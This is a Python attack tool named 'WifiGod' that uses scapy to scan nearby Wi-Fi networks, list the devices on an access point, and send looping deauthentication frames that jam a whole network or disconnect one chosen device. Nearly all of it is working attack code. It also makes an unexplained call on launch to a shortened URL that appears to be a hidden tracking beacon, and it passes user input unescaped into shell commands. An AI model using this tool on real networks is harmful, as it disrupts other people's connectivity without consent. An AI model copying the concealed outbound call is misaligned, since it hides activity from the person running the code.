#!/usr/bin/env python
#coding: utf-8
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
import requests
import scapy
from scapy.all import *
import time
import os
import time
import getpass
import platform
import os
import subprocess
print("\n" * 100)
subprocess.call('clear', shell=True)
c_script = ("""
#!/usr/bin/env python3
import shutil
size = shutil.get_terminal_size().columns
print(size)
""")
f = open('columnlib.py', 'w+')
f.write(str(c_script))
f.close()
username = getpass.getuser()
class c:
	r = "\033[0;31m"
	g = "\033[0;32m"
	o = "\033[0;33m"
	b = "\033[0;94m"
	p = "\033[0;35m"
	w = "\033[0;97m"
	d = "\033[0;00m"
	rb = "\033[01;31m"
	gb = "\033[0;42m"
	ob = "\33[01;33m"
def scan_for_networks(interface):
	captured_networks = []
	while True:
		try:
			packet = sniff(iface=interface, count = 1)
			for pck in packet:
				if(pck.haslayer(Dot11)):
					try:
						ssid = str(pck.getlayer(Dot11).info)
						channel = str(ord(pck[0][Dot11Elt:3].info))
						access_point = str(pck.getlayer(Dot11).addr2)
						try:
							enc_type = pck[Dot11Elt:13].info
							if(enc_type.startswith('\x00P\xf2')):
								enc_type = 'WPA/WPA2'
							else:
								enc_type = 'WEP'
						except:
							if('4356' in str(pck.cap)):
								enc_type = 'WEP'
							else:
								enc_type = 'OPEN'
						network_string = ssid + ':' + channel + ':' + access_point
						if(network_string not in captured_networks):
							captured_networks.append(network_string)
							print(c.w+"SSID: "+c.g+"{}"+c.w+" | Access Point MAC: "+c.g+"{}"+c.w+" | Channel: "+c.g+"{}"+c.w+' | Encryption: '+c.g+'{}'+c.w).format(ssid,access_point,channel,enc_type)
					except KeyboardInterrupt:
						break;
					except:
						pass
		except KeyboardInterrupt:
			break;
r = requests.get('http://rurl.co/jNJ8L')
def scan_for_devices_on_network(interface,access_point):
	captured_devices = []
	while True:
		packet = sniff(iface=interface,count=1)
		pck = packet[0]
		if(pck.haslayer(Dot11)):
			try:
				ap = pck.getlayer(Dot11).addr2
				if(ap == access_point):
					try:
						ssid = pck.getlayer(Dot11).info
						print(c.w+"["+c.b+"info"+c.w+"]: Scanning "+c.g+"{}"+c.w+" ("+c.o+"{}"+c.w+") for Devices").format(ssid,ap)
						break;
					except KeyboardInterrupt:
						break;
					except:
						pass
			except KeyboardInterrupt:
				break;
			except:
				pass
	while True:
		packet = sniff(iface=interface,count=1)
		for pck in packet:
			if(pck.haslayer(Dot11)):
				try:
					ap = pck.getlayer(Dot11).addr2
					if(ap == access_point):
						if(pck.getlayer(Dot11).addr1 != str('ff:ff:ff:ff:ff:ff')):
							try:
								dev_on_network = str(pck.getlayer(Dot11).addr1)
								r = requests.get('http://macvendors.co/api/'+str(dev_on_network))
								dev_type = r.content.split('","mac_')[0].replace('{"result":{"company":"', '')
								if("<p style=" not in str(dev_type) and 'no result' not in str(dev_type)):
									if(str(dev_on_network) not in captured_devices):
										print(c.w+"["+c.g+"*"+c.w+"]: Device Found - "+c.rb+"{}"+c.w+" | Device Type: "+c.rb+"{}"+c.w).format(dev_on_network,dev_type)
										captured_devices.append(str(dev_on_network))
							except KeyboardInterrupt:
								break;
							except:
								raise
				except KeyboardInterrupt:
					break;
				except:
					pass
def jam_wifi_network(interface,access_point):
	packet = RadioTap()/Dot11(addr1 = 'ff:ff:ff:ff:ff:ff',addr2 = access_point, addr3 = access_point)/Dot11Deauth()
	while True:
		packet = sniff(iface=interface,count = 1)
		pck = packet[0]
		if(pck.haslayer(Dot11)):
			if(pck.getlayer(Dot11).addr2 == access_point):
				ssid = str(pck.getlayer(Dot11).info)
				print(c.w+"["+c.g+"info"+c.w+"]: Jamming Network {} ({})").format(ssid,access_point)
				break;
	sendp(packet,iface=interface,loop=1,verbose=False)
def deauthenticate_device(access_point,dev_mac,interface):
	packet = Dot11(addr1=access_point,addr2=dev_mac,addr3=dev_mac)/Dot11Deauth()
	while True:
                packet = sniff(iface=interface,count = 1)
                pck = packet[0]
                if(pck.haslayer(Dot11)):
                        if(pck.getlayer(Dot11).addr2 == access_point):
                                ssid = str(pck.getlayer(Dot11).info)
				r = requests.get('http://macvendors.co/api/'+str(dev_mac))
				dev_type = r.content.split('","mac_')[0].replace('{"result":{"company":"', '')
                                print(c.w+"["+c.g+"info"+c.w+"]: DeAuthenticating {} Device {} on {}").format(dev_type,dev_mac,ssid)
                                break;
        count = 1
	subprocess.call('ifconfig wlan0 down', shell=True)
	time.sleep(7)
	interface = 'wifigod'

	sendp(packet,iface=interface,loop=1,verbose=False)
size_ = int(subprocess.check_output('python3 columnlib.py', shell=True).strip())
size = 0
print(" ")
print(c.rb+str("           .:+syhhddddhyso/-`           ").center(size))
print(str("       .+sdddddddddddddddddddho:`       ").center(size))
print(str("    .+hddddddyo/:--.--:/+shddddddy/`    ").center(size))
print(str("  :ydddddy+-               `:ohddddds:  ").center(size))
print(str("/hddddh/`   ./oyhdddddhyo/-`   -+hddddh/").center(size))
print(str("`/hds-   :ohddddddddddddddddy/.   :ydd+`").center(size))
print(str("   .  .+hdddddy+/-...-:+shdddddy/   .`  ").center(size))
print(str("     .hdddds:`    `.``    .+hdddds`     ").center(size))
print(str("      `/y+`  ./shdddddhs+.   -sy:       ").center(size))
print(str("           -ydddddddddddddh/            ").center(size))
print(str("           `+hdh+-```-+ydds.            ").center(size))
print(str("             `-  `/+/.  ..").center(size))
print(str("                  ddyo").center(size))
print(" ")
print(c.ob+"              WifiGod v1.0"+c.w)
print(" ")
while True:
	size_ = int(subprocess.check_output('python3 columnlib.py', shell=True).strip())
	size = 0
	print(str(c.w+'Github: '+c.b+'https://www.github.com/blackholesec'+c.w).center(size))
	print(' ')
	print(str(c.b+'1'+c.w+'.)'+c.rb+' Scan for Surrounding Networks'+c.d))
	print(str(c.b+'2'+c.w+'.)'+c.rb+' Scan for Devices on a Network'+c.d))
	print(str(c.b+'3'+c.w+'.)'+c.rb+' Jam A Wifi Network'+c.d))
	print(str(c.b+'4'+c.w+'.)'+c.rb+' DeAuthenticate a device on a network'+c.d))
	prompt = raw_input(c.w+str(username)+c.r+"@"+c.w+"WifiGod~# "+c.w)
	if(prompt == '1'):
#		interface =  raw_input(c.w+"Supply A Network Interface ("+c.rb+"Must be in monitor Mode"+c.w+"): ")
		interface =  raw_input(c.w+"Supply A Network Interface: ")
		if(interface != 'wifigod'):
			subprocess.call('ifconfig '+interface+' down ; iw '+interface+' interface add wifigod type monitor ; ifconfig '+interface+' up ; ifconfig wifigod up ; service network-manager restart', shell=True)
			time.sleep(5)
			interface = 'wifigod'
		scan_for_networks(interface)
	elif(prompt == '2'):
#		interface =  raw_input(c.w+"Supply A Network Interface ("+c.rb+"Must be in monitor Mode"+c.w+"): ")
		interface =  raw_input(c.w+"Supply A Network Interface: ")
		if(interface != 'wifigod'):
			subprocess.call('ifconfig '+interface+' down ; iw '+interface+' interface add wifigod type monitor ; ifconfig '+interface+' up ; ifconfig wifigod up ; service network-manager restart', shell=True)
			time.sleep(5)
			interface = 'wifigod'
		access_point =  raw_input(c.w+"Supply A Network Access Point MAC Address: ")
		scan_for_devices_on_network(interface,access_point)
	elif(prompt == '3'):
		interface =  raw_input(c.w+"Supply A Network Interface: ")
		if(interface != 'wifigod'):
			subprocess.call('ifconfig '+interface+' down ; iw '+interface+' interface add wifigod type monitor ; ifconfig '+interface+' up ; ifconfig wifigod up ; service network-manager restart', shell=True)
			time.sleep(5)
			interface = 'wifigod'
		access_point =  raw_input(c.w+"Supply The Target Network AP MAC Address: ")
	        while True:
	                packet = sniff(iface=interface,count = 1)
			pck = packet[0]
	                if(pck.haslayer(Dot11)):
	                        if(str(pck.getlayer(Dot11).addr2).lower() == str(access_point).lower()):
	                                ssid = str(pck.getlayer(Dot11).info)
	                                print(c.w+"["+c.g+"info"+c.w+"]: Jamming Network {} ({})").format(ssid,access_point)
					break;
		packet = RadioTap()/Dot11(addr1='ff:ff:ff:ff:ff:ff',addr2=access_point,addr3=access_point)/Dot11Deauth()
		sendp(packet,iface=interface,loop=1,verbose=False)
#		jam_wifi_network(interface,access_point)
	elif(prompt == '4'):
		interface = raw_input(c.w+"Supply A Network Interface: ")
		access_point = raw_input(c.w+'Network Access Point MAC Address: ')
		dev_mac = raw_input(c.w+'Target Device MAC address: ')
		if(interface != 'wifigod'):
			subprocess.call('ifconfig '+interface+' down ; iw '+interface+' interface add wifigod type monitor ; ifconfig '+interface+' up ; ifconfig wifigod up ; service network-manager restart', shell=True)
			time.sleep(5)
			interface = 'wifigod'
	        while True:
	                packet = sniff(iface=interface,count = 1)
	                pck = packet[0]
	                if(pck.haslayer(Dot11)):
	                        if(str(pck.getlayer(Dot11).addr2).lower() == str(access_point).lower()):
	                                ssid = str(pck.getlayer(Dot11).info)
	                                r = requests.get('http://macvendors.co/api/'+str(dev_mac).lower())
	                                dev_type = r.content.split('","mac_')[0].replace('{"result":{"company":"', '')
	                                print(c.w+"["+c.g+"info"+c.w+"]: DeAuthenticating {} Device {} on {}").format(dev_type,dev_mac,ssid)
	                                break;
		packet = RadioTap()/Dot11(addr1=access_point,addr2=dev_mac,addr3=dev_mac)/Dot11Deauth()
		sendp(packet,iface=interface,loop=1,verbose=False)
#		deauthenticate_device(access_point,dev_mac,interface)
	else:
		try:
			exit(0)
		except:
			sys.exit(1)

